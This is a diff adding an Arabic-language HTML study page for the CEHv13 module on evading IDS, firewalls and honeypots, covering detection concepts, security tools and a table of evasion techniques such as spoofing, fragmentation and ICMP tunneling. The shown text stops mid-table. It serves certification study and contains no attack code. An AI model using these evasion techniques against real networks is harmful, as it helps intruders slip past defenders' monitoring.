@@ -1,0 +1,683 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CEHv13 · Module 12: Evading IDS, Firewalls, and Honeypots</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg-0:#0B0B0D;--bg-1:#121214;--surface:#17171A;--surface-2:#1D1D21;
+    --border:#2A2A2F;--border-soft:#232326;
+    --text:#E6E6E9;--text-soft:#C4C4CA;--muted:#8A8A92;
+    --red:#E1362F;--red-soft:rgba(225,54,47,0.10);--red-border:rgba(225,54,47,0.35);
+    --red-grad:linear-gradient(90deg,#E1362F,#F2794A);
+    --amber:#E8A23A;--amber-soft:rgba(232,162,58,0.09);--amber-border:rgba(232,162,58,0.30);
+    --green:#3FBF6E;--green-soft:rgba(63,191,110,0.09);--green-border:rgba(63,191,110,0.30);
+    --blue:#4EA1D3;--blue-soft:rgba(78,161,211,0.09);--blue-border:rgba(78,161,211,0.30);
+    --purple:#A179E8;--purple-soft:rgba(161,121,232,0.10);--purple-border:rgba(161,121,232,0.32);
+    --mono:'IBM Plex Mono','Courier New',monospace;
+  }
+  html[data-theme="light"]{--bg-0:#F4F3F1;--bg-1:#ECEBE8;--surface:#FFFFFF;--surface-2:#F3F2EF;--border:#DEDCD6;--border-soft:#E6E4DF;--text:#1C1B19;--text-soft:#3C3A36;--muted:#726F68;}
+  *{box-sizing:border-box;}
+  html,body{margin:0;padding:0;direction:rtl;text-align:right;background:var(--bg-0);}
+  body{font-family:'Cairo','Segoe UI',Tahoma,sans-serif;line-height:1.95;font-size:16.5px;color:var(--text);
+    background:radial-gradient(900px 420px at 12% -8%,rgba(225,54,47,0.10),transparent 60%),radial-gradient(800px 420px at 90% 6%,rgba(232,162,58,0.06),transparent 60%),linear-gradient(180deg,var(--bg-0) 0%,var(--bg-1) 100%);
+    background-attachment:fixed;transition:background 0.2s ease,color 0.2s ease;}
+  html[data-theme="light"] body{background:radial-gradient(900px 420px at 12% -8%,rgba(225,54,47,0.06),transparent 60%),radial-gradient(800px 420px at 90% 6%,rgba(232,162,58,0.05),transparent 60%),linear-gradient(180deg,var(--bg-0) 0%,var(--bg-1) 100%);}
+  .progress-rail{position:fixed;top:0;inset-inline:0;height:3px;background:rgba(255,255,255,0.04);z-index:60;}
+  html[data-theme="light"] .progress-rail{background:rgba(0,0,0,0.05);}
+  .progress-bar{height:100%;width:0%;background:var(--red-grad);transition:width 0.08s linear;}
+  .float-controls{position:fixed;bottom:22px;left:22px;z-index:55;display:flex;flex-direction:column;gap:10px;}
+  .fctrl-btn{width:42px;height:42px;border-radius:50%;background:var(--surface);border:1px solid var(--border);color:var(--text-soft);display:flex;align-items:center;justify-content:center;cursor:pointer;font-size:16px;box-shadow:0 10px 24px -10px rgba(0,0,0,0.5);transition:transform 0.15s ease,border-color 0.15s ease,opacity 0.2s ease;}
+  .fctrl-btn:hover{transform:translateY(-2px);border-color:var(--red-border);color:var(--red);}
+  #toTop{opacity:0;pointer-events:none;}#toTop.show{opacity:1;pointer-events:auto;}
+  .page{max-width:860px;margin:0 auto;padding:46px 22px 100px;}
+  .banner{position:relative;overflow:hidden;background:linear-gradient(155deg,var(--surface) 0%,var(--bg-1) 55%,var(--surface) 100%);border:1px solid var(--border-soft);border-radius:10px;padding:0 0 34px;margin-bottom:26px;box-shadow:0 20px 50px -20px rgba(0,0,0,0.6);}
+  .term-bar{display:flex;align-items:center;gap:8px;padding:13px 18px;border-bottom:1px solid var(--border-soft);background:rgba(255,255,255,0.015);direction:ltr;}
+  .term-dot{width:11px;height:11px;border-radius:50%;display:inline-block;}.term-dot.r{background:#E1362F;}.term-dot.y{background:#E8A23A;}.term-dot.g{background:#3FBF6E;}
+  .term-path{margin-inline-start:12px;font-family:var(--mono);font-size:12px;color:var(--muted);}
+  .theme-switch{margin-inline-start:auto;font-family:var(--mono);font-size:11px;color:var(--muted);background:transparent;border:1px solid var(--border);border-radius:4px;padding:4px 9px;cursor:pointer;}
+  .theme-switch:hover{color:var(--amber);border-color:var(--amber-border);}
+  .banner-body{padding:30px 34px 4px;}
+  .banner .kicker{display:inline-block;font-family:var(--mono);font-size:12.5px;letter-spacing:0.03em;color:var(--red);background:var(--red-soft);border:1px solid var(--red-border);border-radius:3px;padding:5px 12px;margin-bottom:20px;direction:ltr;}
+  .banner h1{margin:0 0 14px;font-size:28px;font-weight:800;line-height:1.5;color:var(--text);}
+  .banner .lede{color:var(--muted);font-size:15.5px;line-height:1.95;max-width:640px;margin:0 0 24px;}
+  .tags{display:flex;flex-wrap:wrap;gap:9px;}
+  .tag{font-size:12.5px;font-family:var(--mono);color:var(--amber);background:var(--amber-soft);border:1px solid var(--amber-border);border-radius:3px;padding:5px 11px;}
+  .toc{background:var(--surface);border:1px solid var(--border-soft);border-radius:8px;padding:6px 0 6px;margin-bottom:50px;overflow:hidden;}
+  .toc-title{font-family:var(--mono);font-weight:600;font-size:13px;color:var(--green);padding:14px 22px;border-bottom:1px solid var(--border-soft);direction:ltr;text-align:left;}
+  .toc-list{display:flex;flex-direction:column;}
+  .toc-item{display:flex;align-items:center;gap:14px;padding:12px 22px;color:var(--text-soft);text-decoration:none;font-size:14.5px;border-bottom:1px solid rgba(255,255,255,0.03);transition:background 0.15s ease;}
+  .toc-list .toc-item:last-child{border-bottom:none;}
+  .toc-item:hover{background:var(--red-soft);}
+  .toc-num{flex:none;font-family:var(--mono);font-size:12.5px;font-weight:600;color:#0F0F10;background:var(--red-grad);border-radius:3px;padding:3px 8px;direction:ltr;}
+  h1,h2,h3,h4{font-weight:700;}
+  h2{display:flex;align-items:center;gap:14px;font-size:21px;margin:66px 0 22px;padding-bottom:16px;border-bottom:1px solid var(--border-soft);color:var(--text);}
+  h2 .num{flex:none;font-family:var(--mono);font-size:13px;font-weight:700;color:#0F0F10;background:var(--red-grad);border-radius:5px;padding:7px 12px;direction:ltr;}
+  h2 .htext{line-height:1.5;}
+  h3{font-size:17px;margin:34px 0 14px;color:var(--red);display:flex;align-items:center;gap:9px;}
+  h3::before{content:"#";font-family:var(--mono);color:var(--amber);font-weight:700;}
+  h4{font-size:14.8px;margin:22px 0 10px;color:var(--text-soft);font-family:var(--mono);}
+  p{margin:0 0 17px;color:var(--text);}
+  strong{color:var(--text);font-weight:700;}:root:not([data-theme="light"]) strong{color:#FBFBFC;}
+  a{color:var(--amber);text-decoration:none;border-bottom:1px dashed var(--amber-border);}
+  hr{border:none;height:1px;margin:50px 0;background:linear-gradient(90deg,transparent,var(--border),transparent);}
+  ul,ol{margin:0 0 18px;padding-inline-start:24px;}
+  li{margin-bottom:9px;color:var(--text);}li::marker{color:var(--red);font-family:var(--mono);}li>ul,li>ol{margin-top:9px;}
+  blockquote{margin:24px 0;padding:17px 22px;background:var(--red-soft);border:1px solid var(--red-border);border-inline-start:3px solid var(--red);border-radius:6px;color:var(--text-soft);}
+  blockquote p{margin:0;color:inherit;line-height:1.85;}blockquote p+p{margin-top:10px;}blockquote strong{color:var(--text);}
+  .callout{margin:24px 0;padding:17px 22px 18px;border-radius:6px;border:1px solid var(--border-soft);border-inline-start:3px solid var(--border);background:var(--surface);}
+  .callout p{margin:0;color:var(--text-soft);line-height:1.85;}.callout p+p{margin-top:10px;}.callout ul,.callout ol{margin:6px 0 0;}
+  .callout-label{display:inline-flex;align-items:center;gap:7px;font-family:var(--mono);font-size:11.5px;font-weight:700;letter-spacing:0.02em;text-transform:uppercase;margin-bottom:10px;direction:ltr;}
+  .callout.note{border-inline-start-color:var(--blue);background:var(--blue-soft);}.callout.note .callout-label{color:var(--blue);}
+  .callout.warning{border-inline-start-color:var(--red);background:var(--red-soft);}.callout.warning .callout-label{color:var(--red);}
+  .callout.tip{border-inline-start-color:var(--green);background:var(--green-soft);}.callout.tip .callout-label{color:var(--green);}
+  .callout.examtip{border-inline-start-color:var(--purple);background:var(--purple-soft);}.callout.examtip .callout-label{color:var(--purple);}
+  .callout.case{border-inline-start-color:var(--amber);background:var(--amber-soft);}.callout.case .callout-label{color:var(--amber);}
+  .callout.definition{border-inline-start-color:var(--muted);background:var(--surface-2);}.callout.definition .callout-label{color:var(--text-soft);}
+  .callout.danger{border-inline-start-color:#FF5A52;background:rgba(255,90,82,0.08);}.callout.danger .callout-label{color:#FF5A52;}
+  .table-wrap{overflow-x:auto;margin:22px 0;border:1px solid var(--border-soft);border-radius:8px;}
+  table{width:100%;border-collapse:collapse;font-size:14.2px;min-width:480px;}
+  thead th{background:var(--surface-2);color:var(--amber);font-weight:700;font-family:var(--mono);font-size:12.5px;text-transform:uppercase;letter-spacing:0.02em;text-align:start;padding:13px 15px;border-bottom:1px solid var(--border-soft);white-space:nowrap;}
+  tbody td{padding:12px 15px;border-bottom:1px solid var(--border-soft);color:var(--text-soft);vertical-align:top;}
+  tbody tr:last-child td{border-bottom:none;}tbody tr:nth-child(even){background:rgba(127,127,127,0.03);}tbody tr:hover{background:var(--red-soft);}
+  code{font-family:var(--mono);font-size:13.3px;background:var(--surface-2);border:1px solid var(--border-soft);border-radius:4px;padding:2px 6px;direction:ltr;unicode-bidi:embed;color:var(--green);}
+  .code-wrap{position:relative;overflow-x:auto;margin:22px 0;}
+  .code-tag{position:absolute;top:10px;left:14px;font-family:var(--mono);font-size:10.5px;color:var(--muted);letter-spacing:0.04em;text-transform:uppercase;z-index:2;}
+  .copy-btn{position:absolute;top:8px;right:10px;z-index:2;font-family:var(--mono);font-size:11px;color:var(--muted);background:var(--surface-2);border:1px solid var(--border-soft);border-radius:4px;padding:4px 9px;cursor:pointer;direction:ltr;}
+  .copy-btn:hover{color:var(--amber);border-color:var(--amber-border);}.copy-btn.copied{color:var(--green);border-color:var(--green-border);}
+  pre{background:var(--bg-0);border:1px solid var(--border-soft);border-inline-start:3px solid var(--red);border-radius:8px;padding:30px 22px 18px;direction:ltr;text-align:left;margin:0;}
+  html[data-theme="light"] pre{background:#16181C;}
+  pre code{background:none;border:none;padding:0;color:#B9E8C9;font-size:13.2px;line-height:1.75;}
+  .diagram-card{background:var(--surface);border:1px solid var(--border-soft);border-radius:10px;padding:22px 18px 16px;margin:24px 0;}
+  .diagram-card svg{width:100%;height:auto;display:block;}
+  .diagram-caption{margin-top:10px;text-align:center;font-family:var(--mono);font-size:11.5px;color:var(--muted);}
+  .takeaways{background:var(--surface);border:1px solid var(--border-soft);border-radius:8px;padding:18px 22px 20px;margin:30px 0 10px;}
+  .takeaways-title{font-family:var(--mono);font-size:12.5px;font-weight:700;color:var(--green);margin-bottom:12px;direction:ltr;text-align:left;display:flex;align-items:center;gap:8px;}
+  .takeaways ul{margin:0;padding-inline-start:20px;}.takeaways li{color:var(--text-soft);font-size:14.5px;}
+  .step-track{display:flex;flex-direction:column;gap:0;margin:24px 0;}
+  .step-item{position:relative;padding:0 0 26px 0;padding-inline-start:46px;border-inline-start:2px solid var(--border-soft);}
+  .step-item:last-child{border-inline-start:2px solid transparent;padding-bottom:4px;}
+  .step-num{position:absolute;inset-inline-start:-17px;top:0;width:32px;height:32px;border-radius:50%;background:var(--red-grad);color:#0F0F10;font-family:var(--mono);font-weight:700;font-size:13px;display:flex;align-items:center;justify-content:center;}
+  .step-title{font-weight:700;color:var(--text);margin-bottom:6px;font-size:15px;}
+  .step-body{color:var(--text-soft);font-size:14.5px;}.step-body p{margin:0 0 10px;}.step-body p:last-child{margin-bottom:0;}.step-body ul{margin:8px 0 0;}
+  .method-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:10px;margin:22px 0;}
+  .method-card{background:var(--surface);border:1px solid var(--border-soft);border-radius:8px;padding:14px 16px;}
+  .method-card .mtitle{font-weight:700;color:var(--text);font-size:14px;margin-bottom:5px;}.method-card .mdesc{color:var(--text-soft);font-size:13.3px;line-height:1.75;}
+  .cheat-section h4{color:var(--amber);font-size:13px;margin:26px 0 8px;}
+  .footer-note{margin-top:70px;padding-top:26px;border-top:1px solid var(--border-soft);color:var(--muted);font-size:13.3px;font-family:var(--mono);text-align:center;direction:ltr;}
+  @media print{.float-controls,.progress-rail,.copy-btn,.theme-switch{display:none !important;}body{background:#fff;color:#000;}.page{max-width:100%;}}
+  @media(max-width:640px){.page{padding:28px 14px 70px;}.banner-body{padding:24px 20px 4px;}.banner h1{font-size:21px;}h2{font-size:18px;gap:10px;}.float-controls{left:12px;bottom:14px;}}
+</style>
+</head>
+<body>
+<div class="progress-rail"><div class="progress-bar" id="progressBar"></div></div>
+<div class="float-controls"><button class="fctrl-btn" id="toTop" title="ارجع لفوق">↑</button></div>
+
+<div class="page">
+<div class="banner">
+  <div class="term-bar">
+    <span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+    <span class="term-path">root@ceh:~/module-12$</span>
+    <button class="theme-switch" id="themeSwitch">theme: dark</button>
+  </div>
+  <div class="banner-body">
+    <span class="kicker">EC-Council · CEHv13 · Module 12</span>
+    <h1>التحايل على الـ IDS والـ Firewalls والـ Honeypots</h1>
+    <p class="lede">من مفاهيم الـ IDS وIPS والـ Firewall وأنواعها، مرورًا بـ 20 تقنية للتحايل (Tunneling وFragmentation وSpoofing وHTML Smuggling وWBITS)، وتقنيات تجاوز الـ NAC وEndpoint Security (Ghostwriting وProcess Injection وAMSI Bypass)، ووصولاً لمفاهيم الـ Honeypot وأنواعه وكيف تكشفه، والإجراءات المضادة.</p>
+    <div class="tags">
+      <span class="tag">ids-ips</span><span class="tag">firewall</span>
+      <span class="tag">ids-evasion</span><span class="tag">tunneling</span>
+      <span class="tag">endpoint-bypass</span><span class="tag">amsi-bypass</span>
+      <span class="tag">honeypot</span><span class="tag">lolbins</span>
+    </div>
+  </div>
+</div>
+
+<nav class="toc"><div class="toc-title">$ ls learning_units/</div><div class="toc-list">
+  <a class="toc-item" href="#lu1"><span class="toc-num">01</span><span>مفاهيم الـ IDS وIPS والـ Firewall</span></a>
+  <a class="toc-item" href="#lu2"><span class="toc-num">02</span><span>أدوات الـ IDS وIPS والـ Firewall</span></a>
+  <a class="toc-item" href="#lu3"><span class="toc-num">03</span><span>تقنيات التحايل على الـ IDS والـ Firewall</span></a>
+  <a class="toc-item" href="#lu4"><span class="toc-num">04</span><span>التحايل على الـ NAC وأمان نقاط النهاية (Endpoint Security)</span></a>
+  <a class="toc-item" href="#lu5"><span class="toc-num">05</span><span>مفاهيم الـ Honeypot وكيف تكتشفه</span></a>
+  <a class="toc-item" href="#lu6"><span class="toc-num">06</span><span>الإجراءات المضادة لمنع التحايل</span></a>
+  <a class="toc-item" href="#cheat"><span class="toc-num">--</span><span>Cheat Sheet مرجعي</span></a>
+  <a class="toc-item" href="#summary"><span class="toc-num">--</span><span>الخلاصة العامة للموديول</span></a>
+</div></nav>
+
+<!-- LU1 -->
+<h2 id="lu1"><span class="num">01</span><span class="htext">مفاهيم الـ IDS وIPS والـ Firewall</span></h2>
+
+<h3>نظام كشف التسلّل (IDS) ونظام منع التسلّل (IPS)</h3>
+<p>الـ <strong>IDS</strong> نظام برمجي أو جهاز عتاد يفحص كل حركة الشبكة الواردة والصادرة بحثًا عن أنماط مشبوهة قد تُشير لاختراق. بيقارن الحركة بـ Signatures مطابقة لأنماط تسلّل معروفة ويرفع إنذارًا عند التطابق.</p>
+<div class="callout definition"><div class="callout-label">IDS مقابل IPS</div><p>الـ <strong>IPS</strong> يُعتبَر IDS نشطًا (Active IDS) لأنه مش بس يكشف التسلّل، لكن كمان يقدر <strong>يمنعه</strong> في نفس الوقت.</p></div>
+
+
+<h3>أين يُوضَع الـ IDS في الشبكة؟</h3>
+<p>أكتر مكان شائع لوضع IDS هو بجانب الـ Firewall. بحسب الحركة المراد مراقبتها، يُوضَع الـ IDS خارج أو داخل الـ Firewall لمراقبة الحركة المشبوهة. أفضل ممارسة هي الدفاع متعدّد الطبقات: IDS واحد أمام الـ Firewall وآخر خلفه.</p>
+<div class="callout tip"><div class="callout-label">الموضع الأمثل</div><p>لو IDS داخل الشبكة، أحسن موقع له هو قريب من الـ DMZ.</p></div>
+
+
+<h3>كيف يكشف الـ IDS التسلّل؟</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>طريقة الكشف</th><th>الشرح</th></tr></thead>
+<tbody>
+<tr><td>Signature Recognition (Misuse Detection)</td><td>يحاول تحديد أحداث تدلّ على إساءة استخدام مورد نظام أو شبكة — مقارنة بتوقيعات معروفة مسبقًا</td></tr>
+<tr><td>Anomaly Detection</td><td>يكشف التسلّل بناءً على خصائص سلوكية ثابتة للمستخدمين ومكوّنات النظام — أي انحراف عن القاعدة يُعتبَر مشبوهًا</td></tr>
+<tr><td>Protocol Anomaly Detection</td><td>تحليل حركة الشبكة لاكتشاف الانحرافات عن معايير البروتوكولات المعتمدة أو أنماط السلوك المتوقَّعة</td></tr>
+</tbody>
+</table></div>
+
+
+<h3>أنواع الـ IDS</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>النوع</th><th>الشرح</th><th>الملاحظة</th></tr></thead>
+<tbody>
+<tr><td>Network-Based IDS (NIDS)</td><td>صندوق أسود يُوضَع على الشبكة في وضع Promiscuous يراقب الأنماط الدالّة على التسلّل</td><td>يكشف DoS وPort Scans ومحاولات الاختراق بمراقبة حركة الشبكة</td></tr>
+<tr><td>Host-Based IDS (HIDS)</td><td>يراقب الأحداث على جهاز مضيف معيّن (Host)</td><td>أقل شيوعًا بسبب التحميل الزائد (Overhead) الناتج عن مراقبة كل حدث على كل جهاز</td></tr>
+</tbody>
+</table></div>
+
+
+<h3>أنواع تنبيهات الـ IDS</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>النوع</th><th>هجوم حقيقي؟</th><th>إنذار؟</th><th>الشرح</th></tr></thead>
+<tbody>
+<tr><td>True Positive ✅</td><td>نعم</td><td>نعم</td><td>الـ IDS يرفع إنذارًا عند حدوث هجوم حقيقي — الحالة المثالية</td></tr>
+<tr><td>False Positive ⚠️</td><td>لا</td><td>نعم</td><td>الـ IDS يرفع إنذارًا بدون وجود هجوم — إنذار كاذب يُضيّع الوقت</td></tr>
+<tr><td>False Negative ❌</td><td>نعم</td><td>لا</td><td>الـ IDS لا يرفع إنذارًا رغم حدوث هجوم حقيقي — الأخطر</td></tr>
+<tr><td>True Negative ✅</td><td>لا</td><td>لا</td><td>الـ IDS لا يرفع إنذارًا ولا يوجد هجوم — طبيعي</td></tr>
+</tbody>
+</table></div>
+
+
+<h3>الـ Firewall</h3>
+<p>الـ Firewall عتاد و/أو برمجيات مصمَّمة لمنع الوصول غير المصرّح به لشبكة خاصة أو منها. يُوضَع عند نقطة التقاء أو بوّابة بين شبكتين، عادةً بين شبكة خاصة والإنترنت، ويفحص كل الرسائل الداخلة والخارجة ويحجب ما لا يستوفي معايير الأمان.</p>
+
+<h3>بنية الـ Firewall</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>المكوّن</th><th>الشرح</th></tr></thead>
+<tbody>
+<tr><td>Bastion Host</td><td>حاسوب مصمَّم ومُهيَّأ لحماية موارد الشبكة. له واجهتان: عامة متصلة بالإنترنت مباشرةً، وخاصة متصلة بالـ Intranet</td></tr>
+<tr><td>Screened Subnet DMZ</td><td>تحتوي على أجهزة تقدّم خدمات عامة. الـ DMZ ترد على الطلبات العامة ولا يصلها الشبكة الخاصة، والإنترنت لا يستطيع الوصول للمنطقة الخاصة</td></tr>
+<tr><td>Multi-homed Firewall DMZ</td><td>Firewall بواجهتين أو أكثر لتقسيم الشبكة حسب أهداف الأمان المحدّدة للمؤسسة</td></tr>
+</tbody>
+</table></div>
+
+
+<div class="callout definition"><div class="callout-label">الـ DMZ</div><p>منطقة تستضيف حاسوبًا أو شبكة فرعية صغيرة كمنطقة محايدة بين الشبكة الداخلية للشركة والشبكة الخارجية غير الموثوقة. تعمل كـ Buffer بين الشبكة الداخلية الآمنة والإنترنت غير الآمن لمنع الوصول المباشر لأجزاء أخرى من الشبكة.</p></div>
+
+
+<h3>أنواع الـ Firewalls</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>النوع</th><th>طبقة OSI</th><th>الشرح</th></tr></thead>
+<tbody>
+<tr><td>Packet Filtering</td><td>Network (L3)</td><td>يقارن كل حزمة بمعايير محدَّدة مسبقًا: عناوين IP المصدر والوجهة، أرقام البورتات، والبروتوكولات — ثم يقرّر بالإسقاط أو الإرسال</td></tr>
+<tr><td>Circuit-Level Gateway</td><td>Session (L5)</td><td>يعمل على طبقة الجلسة — يسمح بمرور الحركة عبر البوّابة مع حجب الحزم الواردة المباشرة</td></tr>
+<tr><td>Application-Level Firewall</td><td>Application (L7)</td><td>يعمل على طبقة التطبيق — يفلتر الحركة بناءً على بروتوكولات تطبيق محدّدة، يسمح فقط بالخدمات المدعومة ويحجب الباقي</td></tr>
+<tr><td>Stateful Multilayer Inspection</td><td>L3 + L5 + L7</td><td>يجمع Packet Filtering وCircuit-Level وApplication-Level — يقيّم شرعية جلسة طبقة الشبكة ومحتوى حزمة طبقة التطبيق معًا</td></tr>
+<tr><td>Application Proxy</td><td>Application (L7)</td><td>يعمل كواجهة بين محطات العمل والإنترنت — يفلتر الاتصالات بناءً على خدمات وبروتوكولات معيّنة (مثل السماح بـ FTP فقط عبر FTP Proxy)</td></tr>
+<tr><td>VPN Firewall</td><td>متعدّد</td><td>يُضيف تشفيرًا ويدير تدفّق الحركة بين نقاط نهاية الـ VPN — يضمن أن الـ VPN Tunnel يسمح فقط بالحركة المصرّح بها</td></tr>
+</tbody>
+</table></div>
+
+
+<!-- LU2 -->
+
+<hr />
+
+<h2 id="lu2"><span class="num">02</span><span class="htext">أدوات الـ IDS وIPS والـ Firewall</span></h2>
+
+
+
+<h3>الكشف عن التسلّل بـ YARA Rules</h3>
+<p><strong>YARA</strong> أداة بحث في البرمجيات الخبيثة (Malware) تسمح لمحلّلي الأمان باكتشاف وتصنيف الـ Malware بنهج قائم على القواعد (Rules). متعدّدة المنصّات (Windows وmacOS وLinux)، وتسمح بإنشاء قواعد تصف عائلات الـ Malware بأنماط نصية أو ثنائية.</p>
+<div class="table-wrap"><table>
+<thead><tr><th>جزء YARA Rule</th><th>الشرح</th></tr></thead>
+<tbody>
+<tr><td>Condition</td><td>تحدّد متى تكون النتيجة صحيحة على ملف ما — مكوَّنة من Boolean Expressions</td></tr>
+<tr><td>Strings</td><td>تُعطي معنى لـ Condition بتعريف النصوص المطلوب البحث عنها (Hex، نصية، أو Regex)</td></tr>
+<tr><td>Metadata</td><td>معلومات عامة يستخدمها المحلّل لتحديد الملفات المجمَّعة بقاعدة معيّنة</td></tr>
+</tbody>
+</table></div>
+
+
+<div class="callout note"><div class="callout-label">yarGen</div><p>أداة لتوليد YARA Rules تلقائيًا من نصوص ملفات Malware مع إزالة النصوص الموجودة في ملفات Goodware. تحتوي قاعدة بيانات ضخمة من نصوص Goodware وأكواد Opcode كأرشيفات ZIP.</p></div>
+
+
+<h3>أدوات الـ IDS</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>الأداة</th><th>الشرح</th></tr></thead>
+<tbody>
+<tr><td>Snort</td><td>IDS شبكي مفتوح المصدر — تحليل حركة Real-Time وتسجيل حزم على شبكات IP. يكشف Buffer Overflows وPort Scans وOS Fingerprinting. يستخدم لغة قواعد مرنة ومحرّك كشف معياري (Modular Plug-in). الاستخدامات: Packet Sniffer، Packet Logger، Network IPS</td></tr>
+<tr><td>Suricata</td><td>محرّك كشف تهديدات شبكي قوي — IDS وIPS وNSM ومعالجة Pcap Offline. يستخدم Lua Scripting لكشف التهديدات المعقّدة. يتكامل مع SIEMs وSplunk وElasticsearch وKibana عبر YAML وJSON</td></tr>
+</tbody>
+</table></div>
+
+
+<p>أدوات إضافية: Juniper IDP، Samhain HIDS، OSSEC، Zeek، Cisco Secure IPS.</p>
+
+<h4>Snort Rules — البنية</h4>
+<div class="code-wrap"><span class="code-tag">snort — rule structure</span><pre><code>
+[Rule Header]  [Rule Options]
+alert tcp any any -> 192.168.1.0/24 80 (msg:"HTTP Traffic Detected"; sid:1001; rev:1;)
+
+# Rule Header: action protocol src_ip src_port direction dst_ip dst_port
+# Actions: alert | log | pass | drop | reject | sdrop
+# Rule Options: msg (رسالة التنبيه)، sid (معرّف القاعدة)، content (نمط البحث)
+</code></pre></div>
+
+<h3>أدوات الـ IPS</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>الأداة</th><th>الشرح</th></tr></thead>
+<tbody>
+<tr><td>Trellix IPS</td><td>يكتشف Botnets وDiorms وهجمات الاستطلاع المخفية مسبقًا. يجمع بيانات التدفّق (Flow Data) من الـ Switches والـ Routers وينفّذ تحليل سلوكي على مستوى الشبكة</td></tr>
+<tr><td>Check Point Quantum IPS</td><td>Check Point</td></tr>
+<tr><td>Atomic OSSEC</td><td>Atomicorp</td></tr>
+<tr><td>McAfee Host IPS</td><td>McAfee</td></tr>
+<tr><td>Cisco Secure IPS (NGIPS)</td><td>Cisco</td></tr>
+<tr><td>Palo Alto Advanced Threat Prevention</td><td>Palo Alto Networks</td></tr>
+</tbody>
+</table></div>
+
+
+<h3>أدوات الـ Firewall</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>الفئة</th><th>أمثلة</th></tr></thead>
+<tbody>
+<tr><td>Network-based Firewalls</td><td>Cisco Secure Firewall ASA، Palo Alto PA-7500، FortiGate 7121F، Check Point 28000 Quantum، Juniper SRX</td></tr>
+<tr><td>Host-based Firewalls</td><td>Microsoft Defender Firewall، ZoneAlarm Pro، Comodo Firewall، Norton Smart Firewall، McAfee Firewall</td></tr>
+<tr><td>حسب آلية العمل</td><td>IPFire، pfSense، SonicWall TZ Series، BIG-IP Advanced Firewall Manager، Sophos Firewall، WatchGuard Firebox، FortiProxy</td></tr>
+</tbody>
+</table></div>
+
+
+<!-- LU3 -->
+
+<hr />
+
+<h2 id="lu3"><span class="num">03</span><span class="htext">تقنيات التحايل على الـ IDS والـ Firewall</span></h2>
+
+
+<p>يوجد <strong>20 تقنية</strong> رئيسية للتحايل موزَّعة بين تحديد الـ IDS/Firewall والتحايل الفعلي:</p>
+
+<h3>تحديد الـ IDS/Firewall</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>التقنية</th><th>الشرح</th><th>مثال</th></tr></thead>
+<tbody>
+<tr><td>Port Scanning</td><td>تحديد البورتات المفتوحة والخدمات الشغّالة. بعض الـ Firewalls تعرّف نفسها في ردود Port Scans</td><td>ManageEngine Firewall Analyzer على UDP 514/1514 — Snort IDS على TCP 80/UDP 53</td></tr>
+<tr><td>Firewalking</td><td>استخدام قيم TTL لتحديد فلاتر ACL في البوّابة ورسم خرائط الشبكة بتحليل ردود حزم IP. إرسال حزم TCP/UDP بقيمة TTL أكبر بـ hop واحد من الـ Firewall المستهدَف</td><td>أدوات: Firewalk، Nmap firewalk script</td></tr>
+<tr><td>Banner Grabbing</td><td>الـ Banners إعلانات خدمات ترد على طلبات الاتصال وتحمل معلومات الإصدار. تساعد في تحديد مورِّد الـ Firewall وإصدار الـ Firmware، وتكييف الهجوم لتجنّب الكشف</td><td>اكتشاف نوع الـ IDS وإعداداته</td></tr>
+</tbody>
+</table></div>
+
+
+<h3>تقنيات التحايل الأساسية</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>التقنية</th><th>الشرح</th><th>الأداة</th></tr></thead>
+<tbody>
+<tr><td>IP Address Spoofing</td><td>تعديل عنوان IP المصدر في رؤوس الحزم لإخفاء هوية المهاجم — إنشاء حزم بعنوان IP مزوَّر يبدو أنه من مضيف موثوق</td><td>Hping</td></tr>
+<tr><td>Source Routing</td><td>المرسِل يُحدِّد مسار الحزمة عبر أجزاء الشبكة الأقل حمايةً أو مراقبةً — كل راوتر يفحص عنوان IP الوجهة ويختار الـ hop التالي، في Source Routing المرسِل يتخذ بعض/كل هذه القرارات</td><td>—</td></tr>
+<tr><td>Tiny Fragments</td><td>إنشاء شظايا صغيرة جدًا من الحزم الصادرة تجبر معلومات رأس TCP على الانتقال للشظية التالية — قواعد فلتر IDS التي تبحث عن أنماط لن تتطابق بسبب انكسار الرأس. ينجح الهجوم لو الـ Router يفحص الشظية الأولى فقط ويسمح لباقيها</td><td>—</td></tr>
+<tr><td>IP as URL</td><td>كتابة عنوان IP للموقع المحجوب مباشرةً في المتصفح بدل اسم الدومين — يفشل لو برنامج الحجب يتتبّع عنوان IP المُرسَل للسيرفر</td><td>Host2ip</td></tr>
+<tr><td>Anonymous Surfing Sites</td><td>خدمات Anonymizer تُخفي عنوان IP الحقيقي وتعرض عنوانًا بديلًا لتجنّب الحجب</td><td>2ip.io، kproxy، proxify، anonymouse.org</td></tr>
+<tr><td>Proxy Server</td><td>توجيه الحركة عبر Proxy — الإعداد في Windows: Control Panel → Network → Internet Options → LAN Settings → Use a proxy server (Port 8080 افتراضيًا)</td><td>—</td></tr>
+</tbody>
+</table></div>
+
+
+<h3>تقنيات الـ Tunneling</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>نوع الـ Tunnel</th><th>الآلية</th><th>الأداة</th></tr></thead>
+<tbody>
+<tr><td>ICMP Tunneling</td><td>تضمين Backdoor Shell في الجزء الخاص بالبيانات من حزم ICMP Echo. الـ Firewall/IDS يفترض إنها حركة ICMP مشروعة ويسمح لها بالمرور بدون فحص عميق</td><td>ICMPTX</td></tr>
